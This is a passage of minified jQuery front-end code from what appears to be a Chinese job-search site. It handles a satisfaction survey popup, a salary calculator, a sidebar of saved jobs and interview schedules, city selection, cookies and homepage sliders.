                action: "pc-nps-alert-show",
                p: (this.options || {}).cid || ""
            })
        },
        secondStep: function() {
            this.currentLevel && (this.createSecondStepForm(),
            this.$element.find(".satisfaction-collect-operate").show())
        },
        createSecondStepForm: function() {
            var i, e, n = this, a = void 0;
            o.each(n.levelList, function(e, t) {
                t.level == n.currentLevel && (a = t)
            }),
            a && (e = i = "",
            (a.reasonList || []).length && (e = '<span class="collect-reason-tip">(请选择具体原因，我们会及时改进)</span>',
            i = '<ul class="satisfaction-collect-reason">',
            o.each(a.reasonList, function(e, t) {
                i += "<li>" + t + "</li>"
            }),
            i += "</ul>"),
            e = ['<div class="satisfaction-collect-title">' + a.extraTitle + e + "</div>", i, '<textarea class="satisfaction-collect-textarea" rows="3" placeholder="' + a.placeholder + '"></textarea>'],
            n.$element.find(".satisfaction-collect-extra").html(e.join("")).show(),
            n.$element.find(".satisfaction-collect-reason").on("click", "li", function() {
                o(this).hasClass("active") ? o(this).removeClass("active") : o(this).addClass("active")
            }))
        },
        bindEvent: function() {
            var i = this;
            this.$element.find(".satisfaction-collect-close").on("click", function() {
                i.close("close")
            }),
            this.$element.find(".satisfaction-collect-level").on("click", "li", function() {
                var e = o(this).data("level") || 0;
                i.currentLevel != e && (i.currentLevel = e,
                o(this).addClass("active").siblings().removeClass("active"),
                i.secondStep(),
                i.myActionLog({
                    action: "pc-nps-alert-click",
                    p: e
                }))
            }),
            this.$element.find(".satisfaction-collect-submit").on("click", function() {
                var e, t = i.$element.find(".satisfaction-collect-reason li.active").map(function() {
                    return o.trim(o(this).text() || "")
                }).toArray();
                i.$element.find(".satisfaction-collect-reason li").length && !t.length ? o.toast({
                    type: "warning",
                    content: "请选择具体原因"
                }) : 500 < (e = o.trim(i.$element.find(".satisfaction-collect-textarea").val() || "")).length ? o.toast({
                    type: "warning",
                    content: "最多输入500个字"
                }) : (o.toast({
                    type: "success",
                    content: "感谢您的反馈"
                }),
                i.close("confirm"),
                i.myActionLog({
                    action: "pc-nps-alert-submit",
                    p: i.currentLevel,
                    p2: (e = e || "") && e.replace(/\</g, "&lt;").replace(/\>/g, ">").replace("<phone>", "").replace("</phone>", "").replace("<copy>", "").replace("</copy>", ""),
                    p3: t.length ? t.join(",") : 0
                }))
            })
        },
        close: function(e) {
            this.$element.remove(),
            o.isFunction(this.options.onClose) && this.options.onClose(this.$element, e || "")
        },
        myActionLog: function(e) {
            try {
                o.ajax({
                    method: "post",
                    url: "/wapi/zpCommon/actionLog/common.json",
                    data: {
                        ba: JSON.stringify(e)
                    },
                    cache: !1
                })
            } catch (e) {}
        }
    },
    o.satisfactionCollect = function(e) {
        return new t(e)
    }
}(jQuery, (window,
document)),
$(function() {
    var i = $(".salary-calculate-entry input[name=salary]");
    i.on("keypress", function(e) {
        e = e.keyCode || e.which;
        return 48 <= e && e <= 57
    }).on("paste", function() {
        return !1
    }).on("keyup", function() {
        $(this).val($(this).val().replace(/[^0-9]/g, ""))
    }),
    $(".salary-calculate-entry").on("click", ".salary-calculate-btn", function() {
        var e = i.val() || "";
        if (e)
            if (0 == +e)
                $.toast({
                    type: "warning",
                    content: "请输入正确的税前月工资"
                });
            else if (9999999 < +e)
                $.toast({
                    type: "warning",
                    content: "税前月工资不能超过9999999"
                });
            else {
                try {
                    _T.sendEvent("salary-calculator-click-enter", e + "")
                } catch (e) {}
                var t = (window._PAGE || {}).citySiteCode || "";
                window.location.href = "/wage/m_z_" + t + "/" + e + ".html"
            }
        else
            $.toast({
                type: "warning",
                content: "请输入税前月工资"
            })
    })
}),
$(function() {
    var c;
    (c = $(".home-body-wrapper .top-sign-box")).length && (window._PAGE || {}).uid && $.ajax({
        type: "get",
        url: "/wapi/zpuser/wap/ad/getPcActivity",
        success: function(e) {
            function t(e) {
                var t = $.Deferred();
                return o.find("img").eq(e).on("load", function() {
                    t.resolve()
                }),
                t
            }
            var i, n, a, o, s, r;
            0 == e.code && e.zpData && (i = e.zpData || {},
            n = i.data || {},
            e = i.userCommonData || {},
            10 == i.type && 3 != e.status && i.adId && (a = "",
            r = [n.beginGifUrl, n.loopGifUrl, n.endGifUrl],
            $.each(r, function(e, t) {
                a += '<img data-index="' + e + '" src="' + t + '" />'
            }),
            s = ['<div class="solar-banner-wrapper">', a = n.jumpUrl ? '<a href="' + n.jumpUrl + '" target="_blank">' + a + "</a>" : a, '<span class="close-icon"></span>', "</div>"],
            o = $(s.join("")).appendTo(c.find(".inner")),
            s = Math.min(e.status || 0, r.length - 1),
            o.find("img[data-index=" + s + "]").show(0),
            0 == e.status && ($.when([t(0), t(1)], function() {
                var e = setTimeout(function() {
                    o.find("img[data-index=1]").show().siblings("img").hide(),
                    clearTimeout(e)
                }, Math.max(1e3, n.startGifTime))
            }),
            r = (r = {
                adId: i.adId,
                status: 1
            }) || {},
            $.ajax({
                type: "get",
                data: {
                    adId: r.adId,
                    status: r.status
                },
                url: "/wapi/zpuser/wap/ad/avtivity/updateStatus",
                success: function() {}
            })),
            o.on("click", ".close-icon", function() {
                o.find("img[data-index=2]").show(0).siblings().hide(0);
                var e, t = setTimeout(function() {
                    clearTimeout(t),
                    o.remove()
                }, Math.max(900, n.endGifTime - 100));
                e = (e = {
                    adId: i.adId
                }) || {},
                $.ajax({
                    type: "get",
                    data: {
                        adId: e.adId
                    },
                    url: "/wapi/zpuser/wap/ad/close",
                    success: function() {}
                })
            })))
        }
    })
}),
window.top.zpToken)
  , __Tween = (Array.prototype.filter || (Array.prototype.filter = function(e) {
    "use strict";
    if (null == this)
        throw new TypeError;
    var t = Object(this)
      , i = t.length >>> 0;
    if ("function" != typeof e)
        throw new TypeError;
    for (var n, a = [], o = 2 <= arguments.length ? arguments[1] : void 0, s = 0; s < i; s++)
        s in t && (n = t[s],
        e.call(o, n, s, t) && a.push(n));
    return a
}
),
{
    bounceOut: function(e, t, i, n) {
        return (e /= n) < 1 / 2.75 ? i * (7.5625 * e * e) + t : e < 2 / 2.75 ? i * (7.5625 * (e -= 1.5 / 2.75) * e + .75) + t : e < 2.5 / 2.75 ? i * (7.5625 * (e -= 2.25 / 2.75) * e + .9375) + t : i * (7.5625 * (e -= 2.625 / 2.75) * e + .984375) + t
    }
})
  , __throttle = function(e, t, i) {
    var n = null;
    return function() {
        (new Date).getTime();
        clearTimeout(n),
        n = setTimeout(e, t)
    }
};
function EventManger() {
    var o = {};
    this.subscribe = function(e, t) {
        void 0 === o[e] && (o[e] = []),
        o[e].push({
            context: this,
            callback: t
        })
    }
    ,
    this.publish = function(e) {
        if (void 0 === o[e])
            return !1;
        for (var t = Array.prototype.slice.call(arguments, 1), i = 0, n = o[e].length; i < n; i++) {
            var a = o[e][i];
            a.callback.apply(a.context, t)
        }
    }
}
var EventBus = new EventManger
  , myCookie = {};
function getsec(e) {
    var t = +e.substring(1, e.length)
      , e = e.substring(0, 1);
    return "s" == e ? 1e3 * t : "h" == e ? 60 * t * 60 * 1e3 : "d" == e ? 24 * t * 60 * 60 * 1e3 : void 0
}
myCookie.getCookie = function(e) {
    var e = new RegExp("(^| )" + e + "=([^;]*)(;|$)");
    return (e = document.cookie.match(e)) ? unescape(e[2]) : null
}
,
myCookie.setCookie = function(e, t, i) {
    var i = getsec(i)
      , n = new Date;
    n.setTime(n.getTime() + +i),
    document.cookie = e + "=" + escape(t) + ";expires=" + n.toGMTString()
}
,
myCookie.delCookie = function(e) {
    var t = new Date
      , i = (t.setTime(t.getTime() - 1),
    myCookie.getCookie(e));
    null != i && (document.cookie = e + "=" + i + ";expires=" + t.toGMTString())
}
,
window.myCookie = myCookie,
$(function() {
    zpToken.checkInitialized().then(function() {
        $.ajax({
            type: "get",
            url: "/wapi/zpgeek/agreement/update/tip.json",
            dataType: "json",
            success: function(e) {
                0 == e.code && e.zpData && e.zpData.showTip && $.ajax({
                    type: "get",
                    url: "/wapi/zpuser/agreement/view/detail?agreementId=registerprotocol",
                    success: function(e) {
                        0 == e.code && e.zpData && (e = e.zpData.data || {}).content && $.dialog({
                            title: "",
                            content: e.content,
                            closeLayer: !1,
                            closeText: !1,
                            confirmText: "同意",
                            cancelText: !1,
                            bind: !0,
                            wrapClass: "dialog-text-content register-protocol-dialog",
                            lock: !0,
                            onOpen: function(e) {
                                $(".toc-list", $(e)).remove()
                            },
                            onConfirm: function() {
                                this.close(),
                                $.get("/wapi/zpgeek/agreement/agree.json")
                            }
                        })
                    }
                })
            }
        })
    });
    var t, i, n, a, r = {
        init: function(e) {
            this.tabName = e,
            this.siderTab = {
                interest: {
                    title: "感兴趣的职位",
                    requestUrl: "/wapi/zprelation/interaction/geekGetJob?tag=4&isActive=true",
                    url: "/web/geek/jobsfromchat?tag=4",
                    index: 1
                },
                contact: {
                    title: "沟通过的职位",
                    requestUrl: "/wapi/zprelation/interaction/geekGetJob?tag=5&isActive=true",
                    url: "/web/geek/jobsfromchat?tag=5",
                    index: 2
                },
                deliver: {
                    title: "投递过的职位",
                    requestUrl: "/wapi/zprelation/resume/geekDeliverList",
                    url: "/web/geek/jobsfromchat?tag=3",
                    index: 3
                },
                interview: {
                    title: "面试日程",
                    requestUrl: "/wapi/zprelation/interview/geek/data.json",
                    url: "/web/geek/jobsfromchat?tag=2",
                    index: 4
                }
            },
            this.curTab = this.siderTab[this.tabName],
            this.interviewData = {},
            this.showSlideList()
        },
        showSlideList: function() {
            var t = this
              , e = r.loadFun()
              , e = ($("#siderbar .sider-detail").remove(),
            '<div class="sider-detail">            <p class="sider-title">' + this.curTab.title + '<a href="javascript:;">查看全部</a></p>            ' + e + "            </div>");
            $("#siderbar").append(e),
            this.tabTemplate(function(e) {
                e = '<p class="sider-title">' + t.curTab.title + '<a href="javascript:;">查看全部</a></p>                ' + e + " ";
                $("#siderbar .sider-detail").html(e)
            })
        },
        tabCheckall: function() {
            _PAGE.uid ? location.href = this.curTab.url : ShowLoginDialog.showBossLogin()
        },
        getTagData: function() {
            var t = $.Deferred();
            return $.get(this.curTab.requestUrl).success(function(e) {
                e ? ("function" == typeof ajaxGetaway && ajaxGetaway(e.code),
                t.resolve(e)) : $.toast({
                    content: "数据加载出错，请稍后再试",
                    type: "error"
                })
            }),
            t
        },
        tabTemplate: function(i) {
            var n = this
              , a = "";
            this.getTagData().then(function(e) {
                if (0 == e.code && e.zpData) {
                    var t = e.zpData.cardList || e.zpData.interviewList;
                    if (0 == t.length)
                        return a = n.errorTips("notHave"),
                        void i(a);
                    a = 4 == n.curTab.index ? r.getInterviewTemplate(t) : r.getOtherTemplate(t)
                } else
                    1011 == e.code || 7 == e.code ? a = n.errorTips("notLogin") : $.toast({
                        content: e.message,
                        type: "error"
                    });
                i(a)
            })
        },
        getOtherTemplate: function(e) {
            var o = this
              , s = ""
              , r = ""
              , c = ""
              , l = ""
              , d = ""
              , p = "";
            return $.each(e, function(e, t) {
                c = "",
                l = "/job_detail/" + t.encryptJobId + ".html",
                d = t.salaryDesc,
                2 == t.jobValidStatus && (c = "opacity",
                l = "javascript:;",
                d = "停止招聘"),
                t.salaryMonthText && (p = "·" + t.salaryMonthText),
                1 == o.curTab.index && (s = '<button class="btn btn-primary btn-small btn-sider-interest"  data-jobid="' + t.encryptJobId + '">移除</button>');
                var i = t.brandStageName ? '<span class="vline"></span><span>' + t.brandStageName + "</span>" : ""
                  , n = "";
                if (t.afterNameIcons && (t.afterNameIcons || []).length)
                    for (var a = 0; a < t.afterNameIcons.length; a++)
                        n += '<img class="job-medium-icon" src="' + (t.afterNameIcons[a] || {}).url + ' " />';
                r += '                         <li class="' + c + '">                            <a href="' + l + '">                                <h4><span class="sider-degree">' + d + p + '</span><span class="sider-position-title"><span class="title-text' + (1 == t.proxyType || 3 == t.proxyType ? "" : " no-medium") + '">' + t.jobName + "</span>" + n + '</span></h4>                                <p class="company-info">                                    <span>' + t.brandName + "</span>" + i + '                                </p>                                <p>                                    <img class="user-avatar" src="' + t.bossAvatar + '" alt=""/>                                    <span class="user-text">' + t.bossName + '<span class="vline"></span>' + t.bossTitle + "</span>                                    " + s + "                                </p>                            </a>                        </li>"
            }),
            '                    <ul class="sider-template">                        ' + r + '                      </ul>                    <a class="siderbar-more" href="' + this.curTab.url + '">查看更多</a>'
        },
        getInterviewTemplate: function(e) {
            var t, i = "", n = "", a = (btnstr = "",
            r.getInterviewData(e));
            for (t in this.interviewData = a) {
                var o = new Date(a[t][0].appointmentDate)
                  , s = o.getDate()
                  , o = +o.getMonth() + 1
                  , n = "";
                $.each(a[t], function(e, t) {
                    btnstr = "",
                    0 == t.statusCode && (btnstr = '                        <span class="btns-sider-interview">                            <a href="javascript:;" class="btn btn-cancel">拒绝</a>                            <a href="javascript:;" class="btn btn-submit">接受</a>                        </span>'),
                    n += '                    <li data-interviewId="' + t.interviewIdStr + '">                        <div class="interview-container">                            <h4 class="sub-title"><span class="interview-status">' + t.statusDesc + '</span><span class="company-name">' + t.brandName + '</span></h4>                            <p class="interview-info">                                时间：<span>' + t.appointmentTime.split(" ")[1] + "</span><br>                                职位：<span>" + t.jobName + "</span><br>                                薪资：<span>" + t.jobSalary + '</span><br>                            </p>                            <p class="interview-user-info">                                <img src="' + t.bossAvatar + '"  alt=""/>                                <span class="user-text">' + t.bossName + '<span class="vline"></span>' + t.bossTitle + "</span>                                " + btnstr + "                            </p>                        </div>                     </li>"
                }),
                i += '                <div class="oneday-wrap ' + t + '" data-value = "' + t + '">                <p class="interview-time"> ' + a[t][0].appointmentWeekDesc + " <span>" + o + "月" + s + '日</span></p>                <ul class="interview-list">                ' + n + "                </ul>                </div>"
            }
            return i += '<a class="siderbar-more" href="/web/geek/jobsfromchat?tag=2&page=1">查看更多</a>'
        },
        getInterviewData: function(e) {
            var n = {};
            return $.each(e, function(e, t) {
                var i = t.interviewIdStr;
                n[i] || (n[i] = []),
                n[i].push(t)
            }),
            n
        },
        errorTips: function(e) {
            return "notHave" == e ? '                <div class="sider-error-tip">                    <i class="not-have"></i>                    <p>暂时没有' + this.curTab.title + '</p>                    <a href="/job_detail" class="btn btn-sider-more">查看更多职位</a>                </div>' : '                <div class="sider-error-tip">                    <i class="not-login"></i>                    <p>登录后查看' + this.curTab.title + '</p>                    <a href="javascript:;" class="btn btn-login">去登录</a>                </div>'
        },
        loadFun: function() {
            return '            <div class="sider-load">                <i></i>                <p>加载中，请稍等</p>            </div>'
        },
        interviewDefer: function(e, t) {
            var i = $.Deferred();
            return $.get("/wapi/zprelation/interview/geek/operate.json", {
                interviewId: e,
                status: t
            }, function(e) {
                0 == e.code ? i.resolve(e) : $.toast({
                    content: e.resmsg,
                    type: "error"
                })
            }),
            i
        },
        showInviteTip: function(t) {
            $.dialog({
                content: '<div class="text">· 面试前一天18点前，双方都可以申请取消。<br>· 如不取消，请按时出席面试，不要爽约。<br>· 对方爽约，约定时间30分钟可以投诉。<br>· 爽约一方，平台回加【不良记录】并公示。<br>· 为了方便联系，邀请面试成功后，双方自动交换手机联系方式。<br>· 对方将自动获取你的简历附件。</div>',
                title: "约面试诚信守则",
                closeText: !1,
                cancelText: "我再想想",
                confirmText: "保证不爽约",
                wrapClass: "interview-pop",
                onOpen: function(e) {},
                onConfirm: function(e) {
                    t(),
                    e.remove()
                }
            })
        },
        eventHander: function() {
            var a = this;
            $("body").on("click", "#siderbar .siderbar-top li a", function(e) {
                e.preventDefault()
            }),
            $("body").on("click", "#siderbar .siderbar-top li", function(e) {
                e.preventDefault();
                var e = $(this)
                  , t = e.attr("data-value");
                (window._PAGE || {}).uid ? (e.addClass("active").siblings().removeClass("active"),
                r.init(t),
                $("#siderbar .sider-detail").width("310px").css("overflow-y", "auto")) : ShowLoginDialog.showBossLogin({
                    params: {
                        pk: e.find("a").attr("ka") || "",
                        title: {
                            interest: "登录查看感兴趣职位",
                            contact: "登录查看沟通过职位",
                            deliver: "登录查看已投递职位",
                            interview: "登录查看面试日程"
                        }[t] || "",
                        eventLog: {
                            p: e.find("a").attr("ka") || ""
                        }
                    }
                })
            }),
            $("body").on("click", "#siderbar .btn-login", function() {
                ShowLoginDialog.showBossLogin()
            }),
            $("body").on("click", function(e) {
                e = e.target;
                0 == $(e).closest("#siderbar ").length && ($("#siderbar .sider-detail").width("0px").css("overflow-y", "hidden"),
                $("#siderbar .siderbar-top li").removeClass("active"))
            }),
            $("body").on("click", "#siderbar .sider-template li", function(e) {
                var t, i = e.target;
                $(i).hasClass("btn-sider-interest") && (e.preventDefault(),
                t = $(this),
                $.post("/wapi/zprelation/geekTag/job/interest", {
                    jobId: $(i).attr("data-jobid"),
                    tag: "4",
                    flag: "0"
                }, function() {
                    t.slideUp(300, function() {
                        t.remove()
                    })
                }))
            }),
            $("body").on("click", "#siderbar .btns-sider-interview ", function(e) {
                var t = $(this)
                  , i = t.closest("li").index()
                  , n = t.closest(".oneday-wrap").attr("data-value")
                  , e = e.target;
                return $(e).hasClass("btn-submit") ? r.showInviteTip(function() {
                    r.interviewDefer(t.closest("li").attr("data-interviewId"), 1).then(function() {
                        t.closest("li").find(".interview-status").html("即将面试").end().find(".btns-sider-interview").remove()
                    })
                }) : r.interviewDefer(t.closest("li").attr("data-interviewId"), 2).then(function() {
                    a.interviewData[n].splice(i, 1),
                    t.closest("li").find(".interview-status").html("已拒绝").end().slideUp(300, function() {
                        $(this).remove(),
                        0 == a.interviewData[n].length && $("." + n).remove()
                    })
                }),
                !1
            }),
            $("body").on("click", "#siderbar .sider-title a", function() {
                r.tabCheckall()
            })
        }
    }, o = $("#header"), s = $("#siderbar"), c = ($(window).scroll(function() {
        var e = $(window).scrollTop()
          , t = o.height() + $("#top-active-box").height()
          , t = 0 < t - e ? t - e : 0;
        s.css("top", t + "px"),
        e < 20 && s.css("top", t - 1 + "px")
    }),
    r.eventHander(),
    $(".promotion-main a").each(function(e) {
        var t = myCookie.getCookie("lastCity")
          , i = $(this).attr("href");
        (-1 < i.indexOf("/gongsi") || -1 < i.indexOf("/zt/act-factory")) && $(this).attr("href", -1 < (i || "").indexOf("?") ? i + "&city=" + t : i + "?city=" + t),
        -1 < $(this).attr("href").indexOf("admaster.com.cn") && ((new Image).src = "https://v.admaster.com.cn/i/a131280,b3590554,c4789,i0,m202,8a1,8b2,0k10038,h");
        try {
            var n = $(this).parents(".promotion-main").data("id") || ""
              , a = $(this).parents("td")
              , o = a ? "r" + (a.attr("rowspan") || 1) + "c" + (a.attr("colspan") || 1) : ""
              , s = $(this).attr("ka") || "";
            s && $(this).attr("ka", s + "-banner-click-" + n + "-" + (e + 1) + "-" + o)
        } catch (e) {}
    }),
    $(".link-logout").on("click", function(e) {
        e.preventDefault(),
        window.location.href = "/web/zppassport/logout"
    }),
    window.resumeQueryBar = {
        getQueryBar: function() {
            var t = this;
            clearTimeout(this.timer),
            $.ajax({
                type: "get",
                url: "/wapi/zpgeek/resume/parser/querybar.json",
                dataType: "json",
                success: function(e) {
                    0 === e.code && 1 === e.zpData.showType && e.zpData.parserId ? t.setBar(e.zpData) : t.count && (t.count--,
                    t.timer = setTimeout(function() {
                        t.getQueryBar()
                    }, 2e3))
                }
            })
        },
        setBar: function(e) {
            e = '<div class="header-resume-new"><a ka="to_resume_click_1" href="' + (3 == e.target ? "/web/geek/resumeSync" : "/web/geek/resumeAnalyze") + "?parserId=" + e.parserId + '">简历更新提醒<span class="new" style="display:block;">new</span><div class="header-resume-tip">附件[' + e.resumeName + ']已解析成功，可前往查看并补充至在线简历<span class="header-resume-btn">去查看</span></div></a></div>';
            if ($("#header .user-nav .header-resume-new").length)
                $("#header .user-nav .header-resume-new").replaceWith(e);
            else {
                $("#header .user-nav").prepend(e);
                try {
                    _T.sendEvent("to_resume_expose")
                } catch (e) {}
            }
        },
        timer: null,
        count: 0,
        loop: function() {
            0 === this.count && (this.count = 2),
            this.getQueryBar()
        }
    },
    zpToken.checkInitialized().always(function() {
        resumeQueryBar.getQueryBar()
    }),
    $.fn.hoverDelay = function(e) {
        var t, i, n = $.extend({
            hoverDuring: 200,
            outDuring: 200,
            hoverEvent: function() {
                $.noop()
            },
            outEvent: function() {
                $.noop()
            }
        }, e || {});
        return $(this).each(function() {
            $(this).hover(function() {
                clearTimeout(i),
                t = setTimeout(n.hoverEvent, n.hoverDuring)
            }, function() {
                clearTimeout(t),
                i = setTimeout(n.outEvent, n.outDuring)
            })
        })
    }
    ,
    $(".home-box .slider-city-li").width()), l = $(".home-box .slider-city").width() + 4, d = Math.ceil(c / l), p = 1, u = 0;
    function e(e) {
        u = Math.max(Math.min(u + l * e, c - l), 0),
        (0 < e ? $(".city-page-btn.prev") : $(".city-page-btn.next")).show(),
        p += e,
        0 < e && d <= p && $(".city-page-btn.next").hide(),
        e < 0 && p <= 1 && $(".city-page-btn.prev").hide(),
        $(".slider-city-li").animate({
            left: "-" + u + "px"
        })
    }
    function h() {
        var e = arguments;
        n <= i - 1 && (t.eq(n).stop(!0).animate({
            width: "300px"
        }, 500).siblings().stop(!0).animate({
            width: "98px"
        }, 500),
        ++n == i && (n = 0)),
        a = setTimeout(e.callee, 5e3)
    }
    $(".city-page-btn.next").on("click", function() {
        e(1)
    }),
    $(".city-page-btn.prev").on("click", function() {
        e(-1)
    }),
    $(".home-box .slider-main").length && ($(".home-box .slider-main").hwSlider({
        autoPlay: !0,
        arrShow: !0,
        dotShow: !0,
        navShow: !0,
        touch: !0,
        height: 240,
        interval: 5e3,
        effect: "fade"
    }),
    $(".slider-box .pic-all").length && (t = $(".slider-box .pic-all a"),
    i = t.length,
    n = 0,
    t.hover(function() {
        clearTimeout(a),
        300 != $(this).width() && $(this).stop(!0).animate({
            width: "300px"
        }, 500).siblings().stop(!0).animate({
            width: "98px"
        }, 500)
    }, function() {
        n = $(this).index(),
        h()
    }),
    h()));
    function f() {
        Attachment.showUploadWarningPretreatment({
            showCvEntry: !0,
            title: "",
            confirmText: "上传附件简历",
            callbackUpload: function() {
                $.toast({
                    type: "success",
                    content: "上传成功"
                })
            }
        })
    }
    $(".top-sign-box .btn-dialog-upload").on("click", f),
    $("#header .header-resume-upload").on("click", function() {
        "undefined" == typeof _PAGE || _PAGE.isGeekChat || f()
    });
    var m, g, v, w, b, y, x, k, C, T, _, S, D, E = "";
    function j() {
        if (E) {
            try {
                _T.sendEvent("city-sites-dialog-show")
            } catch (e) {}
            $.dialog({
                title: "",
                content: E,
                closeText: !0,
                cancelText: "",
                confirmText: "",
                wrapClass: "home-city-dialog"
            })
        }
    }
    if (m = (new Date).getTime(),
    $.ajax({
        type: "GET",
        url: "/wapi/zpgeek/common/data/city/site.json",
        data: {},
        dataType: "json",
        success: function(e) {
            var n, a, o, t;
            0 == e.code && e.zpData && (o = a = n = "",
            t = e.zpData.hotCitySites || [],
            e = e.zpData.otherCitySites || [],
            $.each(t, function(e, t) {
                var i = window._PAGE || {};
                t.code == i.citySiteCode ? n = t : a += '<li class="city-item"><a ka="city-sites-' + t.code + '" href="' + t.url + '">' + t.name + "</a></li>"
            }),
            $.each(e, function(e, t) {
                var i = window._PAGE || {};
                t.code == i.citySiteCode ? n = t : o += '<li class="city-item"><a ka="city-sites-' + t.code + '" href="' + t.url + '">' + t.name + "</a></li>"
            }),
            t = '<div class="title"><h4 class="title-content title-main">城市选择</h4><div class="title-content title-sub">切换城市分站，寻找当地心仪工作</div></div><div class="content"><div class="content-prompt"><p class="prompt-title">亲爱的用户您好：</p><p class="prompt-desc">切换城市分站，让我们为您提供更准确的信息</p></div><p class="cur-pos">当前定位</p><div class="cur-city"><i class="icon-poi"></i><span class="city-name"><a ka="city-sites-' + n.code + '" href="' + n.url + '">' + n.name + "</a></span></div>" + (a ? '<div class="city-wrapper"><span class="city-list-label">热门城市</span><ul class="city-list">' + a + "</ul></div>" : "") + (o ? '<div class="city-wrapper"><span class="city-list-label">其它城市</span><ul class="city-list">' + o + "</ul></div>" : "") + '<div class="content-footer">其他城市开通中，敬请期待~</div></div>',
            E = t)
        },
        complete: function() {
            try {
                var t = (new Date).getTime()
                  , i = setTimeout(function() {
                    try {
                        var e = t - m;
                        _T.sendTracking("api_response_time_" + e)
                    } catch (e) {}
                    clearTimeout(i)
                }, 2e3)
            } catch (e) {}
        }
    }),
    $("#header .nav-city .nav-city-box").on("click", j),
    $("#header .choose-city").on("click", j),
    $(".nav-city .dorpdown-city").on("click", "li", function() {
        var i = []
          , e = getQueryObject();
        e.city = $(this).attr("data-val"),
        $.each(e, function(e, t) {
            i.push(e + "=" + t)
        }),
        window.location.href = "/?" + i.join("&")
    }),
    $(".nav-city").find(".dorpdown-province").on("mouseover", "li", function() {
        var e = $(this).index()
          , t = ($(this).parent().find("li"),
        $(".nav-city").find(".dorpdown-city ul"))
          , i = ($(".nav-city .dorpdown-province .cur").removeClass("cur"),
        $(this).addClass("cur"),
        t.removeClass("show"),
        t.eq(e).addClass("show"),
        t.eq(e).find("li"));
        0 < i.length && t.eq(e).find("li.cur").length < 1 && i.eq(0).addClass("cur")
    }),
    $(".nav-city").find(".dorpdown-province").on("click", "li", function() {
        var e = $(this).index()
          , e = $(".nav-city").find(".dorpdown-city ul").eq(e);
        0 < e.find("li").length && e.find("li").eq(0).trigger("click")
    }),
    $(".semwrap .slider-main").length) {
        if ($(".semwrap .slider-main").hasClass("disabled"))
            return;
        $(".slider-main").hwSlider({
            autoPlay: !0,
            arrShow: !0,
            dotShow: !1,
            navShow: !0,
            touch: !0,
            interval: 5e3,
            width: 582,
            speed: 1e3,
            height: 426
        })
    }
    function I() {
        $(window).scrollTop() >= $("#main").offset().top ? ($("#main > .home-box").css({
            "margin-top": g + "px"
        }),
        $(".column-search-panel").addClass("fixed")) : ($("#main > .home-box").css({
            "margin-top": 0
        }),
        $(".column-search-panel").removeClass("fixed"))
    }
    function z() {
        $(".home-body-wrapper").length && ($(window).scrollTop() >= $("#main").offset().top ? $(".home-body-wrapper").addClass("fixed-header") : $(".home-body-wrapper").removeClass("fixed-header"))
    }
    function L() {
        v.offset().top,
        $(window).scrollTop(),
        $("body").outerHeight(),
        y.height();
        var e = $(window).height() - ($("#footer").offset().top - $(document).scrollTop());
        0 < e ? w.css("bottom", e) : w.css("bottom", 0)
    }
    function O(e) {
        e.find("img").each(function(e, t) {
            "" == $(this).attr("src") && $(this).attr("src", $(this).attr("data-src"))
        })
    }
    $(".manager-list .manager-inner").length && 1 < $(".manager-list li").length && $(".manager-list .manager-inner").hwSlider({
        autoPlay: !0,
        arrShow: !1,
        dotShow: !0,
        interval: 5e3,
        speed: 500,
        width: 284,
        height: 164,
        navShow: !0,
        touch: !0,
        effect: "fade",
        fadeOut: !1,
        afterSlider: function() {
            $(".manager-list .fold-text").each(function() {
                84 < $(this).height() ? $(this).find(".more-view").show() : $(this).find(".more-view").hide()
            }),
            $(".manager-list .fold-text .more-view").each(function() {
                var e, t = $(this).closest(".job-sec"), i = $(this).closest(".fold-text");
                t && 0 != t.length && (t.height(t.height()).css("overflow", "hidden"),
                e = i.height(),
                i.css({
                    maxHeight: "none",
                    overflow: "visible"
                }),
                i.removeClass("expand"),
                i.find(".more-view").html('展开<i class="fz fz-slidedown"></i>'),
                e + 10 > i.height() ? $(this).hide() : $(this).show(),
                t.removeAttr("style"),
                i.removeAttr("style"))
            })
        }
    }),
    $(".job-menu dl").each(function(n) {
        var a = $(this);
        a.hoverDelay({
            hoverDuring: 100,
            outDuring: 100,
            hoverEvent: function() {
                a.addClass("cur");
                function e(e) {
                    a.find(".menu-sub");
                    var t = $(".job-menu").offset().top - a.offset().top - 3;
                    return Math.max(t, e)
                }
                var t = 0
                  , i = 0
                  , t = (t = $(".top-sign-box").length ? 130 : t) + (i = $(".top-active-box").length ? 120 : i);
                0 != n || 10 == n && $(".ie7").length ? (i = a.get(0).getBoundingClientRect().top - t,
                (t = a.find(".menu-sub")).height() < i ? t.css({
                    "margin-top": e(53 - t.height()) + "px"
                }) : i < 70 && 0 < i ? t.css({
                    "margin-top": "-1px"
                }) : i < 0 ? t.css({
                    "margin-top": e(i) + "px"
                }) : t.css({
                    "margin-top": e(47 - i) + "px"
                })) : 0 != n && 1 != n || !$(".column-search-panel").length || a.find(".menu-sub").css({
                    "margin-top": "-5px"
                })
            },
            outEvent: function() {
                a.removeClass("cur").children(".menu-sub")
            }
        })
    }),
    $(".show-all").hover(function() {
        $(".show-all").hide(),
        $(".all-box").show();
        try {
            _T.sendEvent("category_hover_all")
        } catch (e) {}
    }, function() {}),
    $(".job-menu").hover(function() {}, function() {
        $(".show-all").show(),
        $(".all-box").hide()
    }),
    $(".menu-all .sub-tab li").eq(0).css({
        "border-top-color": "#fff",
        "padding-top": "15px",
        "padding-bottom": "14px"
    }),
    $(".menu-all .sub-tab li").eq(1).css({
        "margin-top": "-1px"
    }),
    $(".menu-all .sub-tab li").on("click", function() {
        var e = $(this).index()
          , t = $(this).parent().find("li")
          , i = $(this).closest(".menu-sub").find(".sub-content ul");
        t.removeClass("cur"),
        $(this).addClass("cur"),
        i.removeClass("show"),
        i.eq(e).addClass("show"),
        0 == e && $(this).css("border-top-color", "#fff"),
        e == t.length - 1 ? $(this).css({
            "border-bottom-color": "#fff",
            "margin-top": "-1px",
            "padding-top": "1px"
        }) : t.eq(t.length - 1).css({
            "border-bottom-color": "#FDFDFE",
            "margin-top": "0",
            "padding-top": "0"
        })
    }),
    $(".company-detail-grab .promotion-job ul").length && 1 < $(".company-detail-grab .promotion-job li").length && ($(".company-detail-grab .promotion-job .option").on("click", "i", function() {
        var e = $(".company-detail-grab .promotion-job ul")
          , t = e.filter(".cur")
          , i = e.index(t)
          , n = i;
        $(this).hasClass("prev") && (0 === i ? n = e.length - 1 : --n,
        e.removeClass("cur left-out right-out"),
        t.addClass("left-out"),
        e.eq(n).addClass("cur")),
        $(this).hasClass("next") && (i === e.length - 1 ? n = 0 : n += 1,
        e.removeClass("cur left-out right-out"),
        t.addClass("right-out"),
